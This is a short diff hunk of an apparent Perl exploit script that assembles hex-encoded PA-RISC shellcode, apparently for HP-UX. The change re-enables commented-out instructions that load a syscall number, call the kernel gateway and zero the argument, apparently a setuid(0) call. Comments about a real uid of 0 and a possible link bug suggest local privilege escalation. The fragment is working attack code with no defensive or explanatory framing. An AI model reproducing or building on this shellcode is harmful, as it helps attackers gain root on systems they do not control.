@@ -39,11 +39,11 @@ $nop=h2cs("08210280");
 $code="";
 # Oddly enough, real uid already == 0
 # Could probably make a + + link bug out of this, too..
-#$code.=h2cs("34160506"); # LDI 643,r22
-#$code.=h2cs("96d60534"); # SUBI 666,r22,r22
-#$code.=h2cs("20200801"); # LDIL L%0xc0000004,r1
-#$code.=h2cs("e420e008"); # BLE 4(sr7,r1)
-#$code.=h2cs("0b5a029a"); # XOR arg0,arg0,arg0
+$code.=h2cs("34160506"); # LDI 643,r22
+$code.=h2cs("96d60534"); # SUBI 666,r22,r22
+$code.=h2cs("20200801"); # LDIL L%0xc0000004,r1
+$code.=h2cs("e420e008"); # BLE 4(sr7,r1)
+$code.=h2cs("0b5a029a"); # XOR arg0,arg0,arg0
 $code.=h2cs("e83f1ffd"); # BL .+8,r1
 $code.=h2cs("08210280"); # NOP
 $code.=h2cs("34020102"); # LDI 129,rp
